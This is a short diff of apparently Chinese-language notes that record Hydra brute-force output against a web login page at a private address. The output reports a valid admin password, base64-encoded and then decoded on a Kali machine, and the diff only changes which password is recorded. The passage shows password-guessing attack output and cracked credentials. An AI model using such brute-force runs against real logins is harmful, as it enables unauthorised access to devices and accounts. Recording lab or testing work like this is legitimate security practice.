@@ -154,15 +154,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-17 15:44:
 [VERBOSE] Page redirected to http://192.168.0.254/login.asp#pwdError
 [VERBOSE] Page redirected to http://192.168.0.254/login.asp#pwdError
 [VERBOSE] Page redirected to http://192.168.0.254/login.asp#pwdError
-[80][http-post-form] host: 192.168.0.254   login: admin   password: QWRtaW5fbHhAMjAxNw==
+[80][http-post-form] host: 192.168.0.254   login: admin   password: QWRtaW5AMjAxNw==
 [STATUS] attack finished for 192.168.0.254 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-17 15:54:15
 
 
 #解密base64字串
-root@kali:/tmp# echo "QWRtaW5fbHhAMjAxNw=="|base64 -d
-Admin_lx@2017
+root@kali:/tmp# echo "QWRtaW5AMjAxNw=="|base64 -d
+Admin@2017
 
 ```
 # 舒服了
